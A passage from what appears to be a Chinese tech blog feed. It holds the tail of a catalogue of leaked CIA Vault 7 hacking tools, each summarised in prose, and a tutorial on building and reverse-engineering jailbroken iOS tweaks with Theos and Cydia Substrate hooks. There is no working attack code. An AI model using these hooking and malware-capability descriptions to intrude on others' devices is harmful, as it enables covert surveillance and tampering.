<li>Fight Club：在特定攻击活动中，利用移动载体作为传播中介，通过在VLC、WinRAR、TrueCrypt、Shamela和Microsoft Office等软件安装程序中捆绑RickyBobby远控，，实现控制感染目标系统的工具组件；（vault7中出现次数：21）</li>
<li>Melomy DriveIn：劫持VLC播放器DLL进程，间接植入RickyBobby远控；（vault7中出现次数：9）</li>
<li>Rain Maker：隐藏于绿色版VLC播放器程序中，利用移动载体作为感染传播中介，当用户向网络隔离的目标系统中插入感染U盘介质时，可以隐蔽实施对网络离系统的文件窃取和信息收集；（vault7中出现次数：101）</li>
<li>Improvise：支持Windows、Mac和Linux主流操作系统的数据收集和窃取工具，可以用于攻击配置、数据后处理、Payload调整设置和攻击方法选择的工具</li>
<li>。针对不同的攻击目标系统，还定义了极具酒吧韵味的名字：Margarita, Dancefloor, Jukebox；（vault7中出现次数：28）</li>
<li>Basic Bit：一款针对Windows系统的键盘记录工具；（vault7中出现次数：158）</li>
<li>Fine Dining：为执行入侵任务的技术特工提供的一系列定制服务，如生成一个伪装的PDF文档，利用该文档在目标Mac系统中执行文件搜集任务，或对特定</li>
<li>序执行DLL劫持；（vault7中出现次数：53）</li>
<li>HammerDrill：利用CD/DVD作为传播感染介质，通过向磁盘中写入恶意代码，实现对目标系统的感染控制；vault7中出现的次数：在HammerDrill</li>
<li>v2.0版本中还有一项功能：若目标系统正在使用Nero进行软件刻录，就会在刻录的新盘中安装32-bit的隐藏木马程序；（vault7中出现次数：12）</li>
<li>Taxman ：（vault7中无介绍）</li>
<li>HyenasHurdle ：（vault7中无介绍）</li>
</ul>
<h2 id="ABI"><a href="#ABI" class="headerlink" title="ABI"></a>ABI</h2><ul>
<li>Frog Prince：全功能木马远控植入集成系统，包括C&amp;C控制端、端口监听和植入软件；（vault7中出现次数：38）</li>
<li>Grasshopper：针对Windows系统的一个高度可配置木马远控植入工具；（vault7中出现次数：91）</li>
<li>Caterpillar：通过安全传输方式从目标系统获取文件的工具；（vault7中出现次数：85）</li>
<li>AntHill：似乎是一个远控植入软件用来进行文件管理的组件；（vault7中出现次数：28）</li>
<li>The Gibson：似乎是一个用来进行C&amp;C控制和监听的程序组件；（vault7中出现次数：19）</li>
<li>Galleon：从目标计算机中把文件通过安全传输方式复制到控制端的一组脚本和工具集；（vault7中出现次数：38）</li>
<li>Assassin：（vault7中无介绍）</li>
<li>HercBeetle – （vault7中无介绍）</li>
<li>CandyMountain –（vault7中无介绍）</li>
<li>Hornet – （vault7中无介绍）</li>
<li>Cascade –（vault7中无介绍）</li>
<li>MagicVikings – （vault7中无介绍）</li>
</ul>
<h1 id="相关的报道"><a href="#相关的报道" class="headerlink" title="相关的报道"></a>相关的报道</h1><ul>
<li><a href="https://threatpost.com/wikileaks-dump-shows-cia-interdiction-of-iphone-supply-chain/124540/" target="_blank" rel="external">WikiLeaks Dump Shows CIA Interdiction of iPhone Supply Chain</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2017.3 月开始 维基解密陆续对 CIA 泄露出的数据进行曝光，截至目前已经曝光了3此。&lt;/p&gt;
&lt;p&gt;本文特意将 曝光的内容进行整理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一系列 — Year Zero （元年）&lt;/li&gt;
&lt;li&gt;第二系列 — &lt;a href=&quot;https://wikileaks.org/vault7/darkmatter/releases/&quot;&gt;Dark Matter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第三系列 — Marble 混淆工具&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="CIA" scheme="http://yoursite.com/tags/CIA/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Tweak 开发</title>
    <link href="http://yoursite.com/2017/04/30/%E5%BC%80%E5%8F%91/%E6%B5%85%E8%B0%88Tweak-%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2017/04/30/开发/浅谈Tweak-开发/</id>
    <published>2017-04-30T01:53:29.000Z</published>
    <updated>2017-06-18T08:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<a id="more"></a>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>详情参考：<a href="http://blog.csdn.net/yohunl/article/details/52085421" target="_blank" rel="external">iOS 越狱的Tweak开发</a></p>
<p>新版的已经是内置CydiaSubstrate.framework,不是网上其它教程中说的需要运行bootstrap.sh脚本或者是从手机上拷贝等方式.</p>
<h1 id="Theos-使用方法"><a href="#Theos-使用方法" class="headerlink" title="Theos 使用方法"></a>Theos 使用方法</h1><p>Theos 当前有12种模板，这里拿书中的 iOSREProject tweak 工程的例子做演示。</p>
<ul>
<li><p>创建项目<br><code>nic.pl</code></p>
</li>
<li><p>模板类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">iOS_Tweak $ nic.pl</div><div class="line">NIC 2.0 - New Instance Creator</div><div class="line">------------------------------</div><div class="line">  [1.] iphone/activator_event</div><div class="line">  [2.] iphone/application_modern</div><div class="line">  [3.] iphone/cydget</div><div class="line">  [4.] iphone/flipswitch_switch</div><div class="line">  [5.] iphone/framework</div><div class="line">  [6.] iphone/ios7_notification_center_widget</div><div class="line">  [7.] iphone/library</div><div class="line">  [8.] iphone/notification_center_widget</div><div class="line">  [9.] iphone/preference_bundle_modern</div><div class="line">  [10.] iphone/tool</div><div class="line">  [11.] iphone/tweak</div><div class="line">  [12.] iphone/xpc_service</div></pre></td></tr></table></figure>
</li>
</ul>
<p>初级阶段常用的类型是：2, 10, 11,</p>
<ul>
<li><p>项目类型：<br>Choose a Template (required): <code>11</code></p>
</li>
<li><p>工程名称：<br>Project Name (required): <code>iOSREProject</code></p>
</li>
<li><p>deb 包名<br>Package Name [com.yourcompany.iosreproject]: <code>com.iosre.iosreproject</code></p>
</li>
<li><p>tweak 作者：<br>Author/Maintainer Name [xx]: <code>xx</code></p>
</li>
<li><p>tweak 作用的对象（指定要 hook的目标APP 的 bundle identifier）<br>[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]: <code>com.apple.springboard</code></p>
</li>
<li><p>tweak 安装完以后要重启的应用<br>[iphone/tweak] List of applications to terminate upon installation (space-separated, ‘-‘ for none) [SpringBoard]: <code>SpringBoard</code></p>
</li>
</ul>
<p>Instantiating iphone/tweak in iosreproject/…<br>Done.</p>
<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>当前创建了一个 tweak 项目，在工程目录下只有4个文件：</p>
<p><a href="#m">Makefile</a><br><a href="#c">control</a><br><a href="#i">iOSREProject.plist</a><br><a href="#t">Tweak.xm</a></p>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a><span id="m">Makefile</span></h3><p>这是一个编译脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#### 额外的编译参数</span></div><div class="line"><span class="comment"># 目标的 ip</span></div><div class="line">THEOS_DEVICE_IP = iosIP</div><div class="line"></div><div class="line"><span class="comment"># 处理器架构</span></div><div class="line">ARCHS = armv7 arm64</div><div class="line"></div><div class="line"><span class="comment"># SDK 版本</span></div><div class="line"><span class="comment"># TARGET = iphone: BASE SDK 编译使用的 SDK 版本:  Deployment target 发布的机型系统版本</span></div><div class="line"><span class="comment"># TARGET = iphone:latest:8.0</span></div><div class="line">TARGET = iphone:8.1:8.0</div><div class="line"></div><div class="line"><span class="comment"># 必须导入的标准编译脚本</span></div><div class="line">include $(THEOS)/makefiles/common.mk</div><div class="line"></div><div class="line"><span class="comment"># Project name</span></div><div class="line">TWEAK_NAME = iOSREProject</div><div class="line"></div><div class="line"><span class="comment"># Source files</span></div><div class="line">iOSREProject_FILES = Tweak.xm</div><div class="line"></div><div class="line"><span class="comment"># 根据选择的模板类型 导入编译脚本</span></div><div class="line">include $(THEOS_MAKE_PATH)/tweak.mk</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 导入 framework</span></div><div class="line">iOSREProject_FRAMEWORKS = UIKit CoreTelephony CoreAudio</div><div class="line"></div><div class="line"><span class="comment"># 导入 privete framework</span></div><div class="line">iOSREProject_PRIVATE_FRAMEWORKS = AppSupport ChatKit IMCore BaseBoard</div><div class="line"></div><div class="line"><span class="comment"># 安装以后, 自动执行的命令</span></div><div class="line">after-install::</div><div class="line">    install.exec <span class="string">"killall -9 SpringBoard"</span></div></pre></td></tr></table></figure>
<blockquote>
<p>注意：private framework 中导入的包可能存在兼容性问题。比如 BaseBoard 这个 private framework只存在 8.0及以上版本的 SDK 里。这种情况在 ios7中无法正常运行，通过弱链接（makefile weak linking）或者 dlopen/dlsym/dlclose 系列函数调用 private framework。</p>
</blockquote>
<h3 id="control"><a href="#control" class="headerlink" title="control"></a><span id="c">control</span></h3><p>control 中的信息会显示在 Cydia 中, 且 control 文件中内容可以修改。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Package: com.iosre.iosreproject   <span class="comment">#deb 包名</span></div><div class="line">Name: iOSREProject</div><div class="line"></div><div class="line"><span class="comment"># 当前ios 版本必须 高于8.0, 且安装 CydiaSubstarte</span></div><div class="line">Depends: mobilesubstrate, firmware (&gt;=8.0)</div><div class="line"></div><div class="line">Version: 0.0.1</div><div class="line">Architecture: iphoneos-arm      <span class="comment"># 目标设备的  架构</span></div><div class="line">Description: An awesome MobileSubstrate tweak!</div><div class="line">Maintainer: xy</div><div class="line">Author: xx</div><div class="line">Section: Tweaks     <span class="comment">#模板类型</span></div></pre></td></tr></table></figure></p>
<p>更多字段在 debian 的官网。</p>
<h3 id="iOSREProject-plist"><a href="#iOSREProject-plist" class="headerlink" title="iOSREProject.plist"></a><span id="i">iOSREProject.plist</span></h3><p>此 plist 文件的作用和 app 开发时的 plist 文件作用相似， 记录配置信息 描述了 tweak 的作用范围。</p>
<p>Filter 包含 3类数组</p>
<ul>
<li>Bundles<ul>
<li>指定 tweak 起作用的APP \&lt; “bundle identifier” ></li>
</ul>
</li>
<li>Executables<ul>
<li>指定作用的 可执行文件 \&lt;文件名></li>
</ul>
</li>
<li>Classes<ul>
<li>指定 作用的 class \&lt;类名></li>
</ul>
</li>
</ul>
<blockquote>
<p>注意: 当Filter 下包含不同的 Array 时需要添加一个 “Mode : Any”, 当只有一个 Array 时不需要。</p>
</blockquote>
<p><span id="plist"></span><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    Filter = &#123;</div><div class="line">        Mode = Any;</div><div class="line">        Executables = (</div><div class="line">            callservicesd,</div><div class="line">            imagent,</div><div class="line">            mediaserverd,</div><div class="line">        );</div><div class="line">        Classes = (</div><div class="line">            NSString,</div><div class="line">            SBIconModel,</div><div class="line">        );</div><div class="line">        Bundles = (</div><div class="line">            "com.apple.springboard",</div><div class="line">            "com.apple.AddressBook",</div><div class="line">        );</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>校验 plist 文件格式：<br><code>plutil -lint xx/xx/iOSREProject.plist</code></p>
<p>不熟悉 xml 语法，使用 xcode 编辑.</p>
<h3 id="Tweak-xm"><a href="#Tweak-xm" class="headerlink" title="Tweak.xm"></a><span id="t">Tweak.xm</span></h3><p>Tweak.xm 后缀 <code>xm</code> 代码文件使用的编程语言。<br><code>x</code> 源文件支持 Logos 和 C语法<br><code>xm</code> 源文件支持Logos 和 C/ C++ 语法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// hook 住 SpringBoard 类里的 _menuButtonDown 函数</span></div><div class="line">%hook SpringBoard</div><div class="line">- (<span class="keyword">void</span>) _menuButtonDown:(id)down</div><div class="line">&#123;</div><div class="line">    NSLog(@<span class="string">"pressed home button"</span>);</div><div class="line">    %<span class="built_in">log</span>((NSString *)@<span class="string">"iOSRE"</span>, (NSString *)@<span class="string">"Debug"</span>);</div><div class="line">    %orig;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%<span class="keyword">new</span></div><div class="line">- (<span class="keyword">void</span>)namespaceNewMethod</div><div class="line">&#123;</div><div class="line">    NSLog(@<span class="string">"add a new method to class SpringBoard"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div><div class="line"></div><div class="line">%hook SBLockScreenDateViewController</div><div class="line">- (<span class="keyword">void</span>)setCustomSubtitleText:(id)arg1 withColor:(id)arg2</div><div class="line">&#123;</div><div class="line">    <span class="comment">// 在锁屏界面显示 "iOS 8 App Reverse Engineering"</span></div><div class="line">    %orig(@<span class="string">"iOS 8 App Reverse Engineering"</span>,  arg2);</div><div class="line">&#125;</div><div class="line">%end</div><div class="line"></div><div class="line">%group iOS7Hook</div><div class="line">%hook iOS7Class</div><div class="line">- (id)iOS7Method</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">%end   <span class="comment">//hook</span></div><div class="line">%end   <span class="comment">//group</span></div><div class="line"></div><div class="line">%group iOS8Hook</div><div class="line">%hook iOS8Class</div><div class="line">- (id)iOS8Method</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">%end   <span class="comment">//hook</span></div><div class="line">%end   <span class="comment">//group</span></div><div class="line"></div><div class="line">%ctor</div><div class="line">&#123;</div><div class="line">  %init()   <span class="comment">//初始化 _ungrouped %group</span></div><div class="line">  <span class="comment">// %init(iOS7Hook)   // 初始化 iOS7Hook %group</span></div><div class="line">  <span class="comment">// %init(iOS8Hook)   // 初始化 iOS8Hook %group</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Logos 函数使用 % 开头。<br>这里用户定义了2个 group(iOS7Hook 和 iOS8Hook), 并且显示定义了 %ctor 负责初始化要使用的 group</p>
<h2 id="编译-打包-安装"><a href="#编译-打包-安装" class="headerlink" title="编译 + 打包 + 安装"></a>编译 + 打包 + 安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">make    // 没有任何文件创建</div><div class="line">make package</div><div class="line">make package install    // 提前在 Makefile 中配置目标 ip</div></pre></td></tr></table></figure>
<p>安装是通过 ssh 命令实现，要求越狱的 iOS 安装 OpenSSH, 需要在 makefile 中设置 <code>THEOS_DEVICE_IP</code>。<br>还可以配置 公钥登录， 具体步骤略。</p>
<p><img src="/include/img/ios_tweak.png" alt="锁屏界面文字替换"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面使用大量篇幅介绍开发 tweak 的流程略显啰嗦，其实 tweak 开发的本质就是 Cydia Substrate 的 hook。<br>hook 的目标进程、可执行文件、类：通过 <projectname>.plist 文件控制<br>具体的 hook 代码：定义在 xm 文件中，可以使用 Object-C/C/C++ 开发<br>hook 实现：通过 Logos 语法封装。</projectname></p>
<p><strong>更多关于 tweak 的高级玩法和 其框架的限制，还要在未来的实践中去摸索</strong></p>
<h1 id="逆向tweak"><a href="#逆向tweak" class="headerlink" title="逆向tweak"></a>逆向tweak</h1><p>将deb 包解压会有2个重要的压缩文件：</p>
<ul>
<li><code>control.tar.gz</code>  安装控制文件</li>
<li><code>data.tar.lzma</code>   二进制程序（动态库，可执行文件等）<br>最后那个后缀是压缩类型，可能是lzma, gz，xz等。</li>
</ul>
<p>解压上面的压缩包以后得到 control文件 和 data 目录。</p>
<h2 id="control-文件"><a href="#control-文件" class="headerlink" title="control 文件"></a>control 文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Package: com.iosre.iosreproject</div><div class="line">Name: iOSREProject</div><div class="line">Depends: mobilesubstrate</div><div class="line">Architecture: iphoneos-arm</div><div class="line">Description: An awesome MobileSubstrate tweak!</div><div class="line">Maintainer: xxx</div><div class="line">Author: xxx</div><div class="line">Section: Tweaks</div><div class="line">Version: 0.0.1-4+debug</div><div class="line">Installed-Size: 136</div></pre></td></tr></table></figure>
<h2 id="data-目录"><a href="#data-目录" class="headerlink" title="data 目录"></a>data 目录</h2><p>我逆向了某个 tweak 解压data.tar.gz 发现Library 下有3个文件夹，而我写的ioreproject只有MobileSubstrate一个文件夹。<br><img src="/include/img/ios/tweak_data.png" alt=""></p>
<p>后来发现 PreferenceBundles 下面是一个设置里的一个插件（我们先不关注这个）。<br>直接分析 动态库 <code>/data/Library/MobileSubstrate/DynamicLibraries/</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">__ZL55_logos_method$_ungrouped$SpringBoard$namespaceNewMethodP11SpringBoardP13objc_selector:        // _logos_method$_ungrouped$SpringBoard$namespaceNewMethod(SpringBoard*, objc_selector*)</div><div class="line">00007d70         push       &#123;r7, lr&#125;</div><div class="line">00007d72         mov        r7, sp</div><div class="line">00007d74         sub        sp, #0x8</div><div class="line">00007d76         movw       r2, #0x2fa</div><div class="line">00007d7a         movt       r2, #0x0                                            ; 0x2fa</div><div class="line">00007d7e         add        r2, pc                                              ; @&quot;add a new method to class SpringBoard&quot;</div><div class="line">00007d80         str        r0, [sp, #0x8 + var_4]</div><div class="line">00007d82         str        r1, [sp, #0x8 + var_0]</div><div class="line">00007d84         mov        r0, r2</div><div class="line">00007d86         blx        imp___picsymbolstub4__NSLog</div><div class="line">00007d8a         add        sp, #0x8</div><div class="line">00007d8c         pop        &#123;r7, pc&#125;</div><div class="line">                        ; endp</div><div class="line"> */</div><div class="line"></div><div class="line">%new</div><div class="line">- (void)namespaceNewMethod</div><div class="line">&#123;</div><div class="line">  NSLog(@&quot;add a new method to class SpringBoard&quot;);</div><div class="line">&#125;</div><div class="line">%end</div></pre></td></tr></table></figure></p>
<p>采用标准的arm 汇编， 和android so 一样。</p>
<h1 id="Logos-语法"><a href="#Logos-语法" class="headerlink" title="Logos 语法"></a>Logos 语法</h1><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><ul>
<li><code>%log</code> 在%hook 内部使用。</li>
<li><code>%orig</code> 执行被 hook 的函数的原始代码</li>
<li><code>%group</code> 便于代码管理及按条件初始化分组。不属于某个自定义group 的 hook ， 默认归类到%group _ungrouped<br><strong>group 必须要配置 %init 使用才能生效。</strong></li>
<li><code>%init</code> 只有调用了%init(group name) 才能使对应的%group 起作用</li>
<li><code>%ctor</code> tweak 的构造函数, 完成初始化工作; 如果不定义,theos 会自动生成一个%ctor</li>
<li><code>%c</code> 动态获取一个类的定义</li>
<li><code>%new</code>  给一个现有的 class，添加新函数</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>作用域</th>
</tr>
</thead>
<tbody>
<tr>
<td>%hook</td>
<td>%group</td>
</tr>
<tr>
<td>%log</td>
<td>%hook</td>
</tr>
<tr>
<td>%orig</td>
<td>%hook</td>
</tr>
<tr>
<td>%init</td>
<td>%hook , %ctor</td>
</tr>
<tr>
<td>%c</td>
<td>%hook , %ctor</td>
</tr>
</tbody>
</table>
<p>Logos 语言的本质是theos对cydia Substrate提供的函数的宏封装。</p>
<h1 id="Cydia-Substrate-hook-iOS"><a href="#Cydia-Substrate-hook-iOS" class="headerlink" title="Cydia Substrate hook iOS"></a>Cydia Substrate hook iOS</h1><p><a href="http://blog.csdn.net/yohunl/article/details/52085421" target="_blank" rel="external">Cydia Substrate</a>由三部分组成, 需要在越狱手机上通过 Cydia 安装。</p>
<ul>
<li>MobileHooker</li>
<li>MobileLoader</li>
<li>Safe mode</li>
</ul>
<h2 id="MobileHooker"><a href="#MobileHooker" class="headerlink" title="MobileHooker"></a>MobileHooker</h2><p>此模块专门用来实现 hook, 下面3个函数就来执行 hook操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">IMP MSHookMessage(Class class, SEL selector, IMP replacement, const char* prefix);  // prefix should be NULL.</div><div class="line"></div><div class="line">void MSHookMessageEx(Class class, SEL selector, IMP replacement, IMP *result);</div><div class="line"></div><div class="line">void MSHookFunction(void* function, void* replacement, void** p_original);</div></pre></td></tr></table></figure></p>
<p>上面三个函数都是用来 hook，主要区别在于hook 的语言。</p>
<ul>
<li>针对 C/C++ 函数, 使用 <code>MSHookFunction(...)</code>,  使用 inline hook 的原理在函数头部添加汇编指令跳转。</li>
<li>针对 Object-C 函数, 使用 <code>MSHookMessageEx(...)</code>, 使用 OC 语言特性。</li>
</ul>
<p><code>MSHookFunction(...)</code> 和 <code>MSHookMessageEx(...)</code> 使用案例， 熟悉 hook 的 api 方便逆向 (不展示 hook C++ private method 的代码)</p>
<h3 id="MSHookFunction"><a href="#MSHookFunction" class="headerlink" title="MSHookFunction(...)"></a><code>MSHookFunction(...)</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">MSHook(<span class="keyword">void</span>, CFShow, CFTypeRef obj) &#123;           <span class="comment">// our replacement of CFShow().</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Calling original CFShow(%p)..."</span>, obj);</div><div class="line">  _CFShow(obj);                                 <span class="comment">// calls the original CFShow.</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">" done.\n"</span>);</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">// hook CFShow to our own implementation.</span></div><div class="line">MSHookFunction(CFShow, MSHake(CFShow));</div><div class="line"><span class="comment">// From now on any call to CFShow will pass through our CFShow replacement first.</span></div><div class="line">...</div><div class="line">CFShow(CFSTR(<span class="string">"test"</span>));</div></pre></td></tr></table></figure>
<h3 id="MSHookMessageEx"><a href="#MSHookMessageEx" class="headerlink" title="MSHookMessageEx(...)"></a><code>MSHookMessageEx(...)</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> IMP original_UIView_setFrame_;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">replaced_UIView_setFrame_</span><span class="params">(UIView* self, SEL _cmd, CGRect frame)</span> </span>&#123;  <span class="comment">// Note the implicit self and _cmd parameters are needed explicitly here.</span></div><div class="line">  CGRect originalFrame = self.frame;</div><div class="line">  NSLog(<span class="string">"Changing frame of %p from %@ to %@"</span>, self, NSStringFromCGRect(originalFrame), NSStringFromCGRect(frame));</div><div class="line">  original_UIView_setFrame_(self, _cmd, frame);    <span class="comment">// Remember to pass self and _cmd.</span></div><div class="line">&#125;</div><div class="line">...</div><div class="line">MSHookMessageEx([UIView <span class="keyword">class</span>], @selector(setFrame:), (IMP)replaced_UIView_setFrame_, (IMP *)&amp;original_UIView_setFrame_);</div><div class="line">...</div><div class="line">myView.frame = CGRectMake(<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>);</div></pre></td></tr></table></figure>
<p>实际上 CydiaSubstarte 提供的 api 远不止上面的3个，还有很多功能的 api，比如：MSFindSymbole(..)、MSGetImageByName(…)等等，在<a href="http://www.cydiasubstrate.com/api/c/" target="_blank" rel="external">官方文档</a>中均有介绍。</p>
<p>这三个都是用来进行hook操作的,也就是我们在非越狱开发中常说的swizzle! cydia Substrate还提供了MobileLoader：“钩子”需要在运行时被加载，靠的就是MobileLoader的功劳。MobileLoader会在适当的时机加载<code>/Library/MobileSubstrate/DynamicLibraries/</code>目录下的动态库（.dylib，这是tweak的最终产品）</p>
<h2 id="MobileLoader"><a href="#MobileLoader" class="headerlink" title="MobileLoader"></a>MobileLoader</h2><p>此模块用来加载手机中的 tweak，这些 tweak 最终是以 dylib 库的形式保存在<code>/Library/MobileSubstrate/DynamicLibraries/</code>目录下。</p>
<p>需要注意的是 MobileLoader 的作用范围并不是全局 hook。 还记得我们在上面介绍的 <a href="#plist">plist 文件吗</a>，其中只定义了Filter 过滤器，用来过滤要 hook 的目标进程、目标可执行文件、以及目标类。<br>那么 MobileLoader 就会根据 plist 中过滤器指定的作用范围，有选择的在不同进程里通过 dlopen 加载对应的 dylib。</p>
<p><strong>注意</strong>：从 ios9 开始必须定义 plist 文件。没有相应的plist的Dylib将不被加载。 要复制以前没有过滤器plist的效果，导致将dylib加载到所有进程中，请将Filter设置为com.apple.Security。</p>
<p><img src="/include/img/loader.png" alt=""></p>
<h2 id="Safe-mode"><a href="#Safe-mode" class="headerlink" title="Safe mode"></a>Safe mode</h2><p>为了防止编写的 tweak 不规范导致整个进程崩溃，所以 添加了 Safe Mode，它可以捕获 一下6种信号，然后进入安全模式。</p>
<ul>
<li>SIGABRT</li>
<li>SIGILL</li>
<li>SIGBUS</li>
<li>SIGSEGV</li>
<li>SIGSYS</li>
</ul>
<h1 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h1><h2 id="检查是否加壳"><a href="#检查是否加壳" class="headerlink" title="检查是否加壳"></a>检查是否加壳</h2><p><code>otool -l WeChat.app/WeChat | grep -B 2 crypt</code></p>
<p>1代表加密了，0代表被解密了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">         cmd LC_ENCRYPTION_INFO</div><div class="line">      cmdsize 20</div><div class="line">     cryptoff 16384</div><div class="line">    cryptsize 16384</div><div class="line">      cryptid 0</div><div class="line">--</div><div class="line">          cmd LC_ENCRYPTION_INFO_64</div><div class="line">      cmdsize 24</div><div class="line">     cryptoff 16384</div><div class="line">    cryptsize 16384</div><div class="line">      cryptid 0</div></pre></td></tr></table></figure></p>
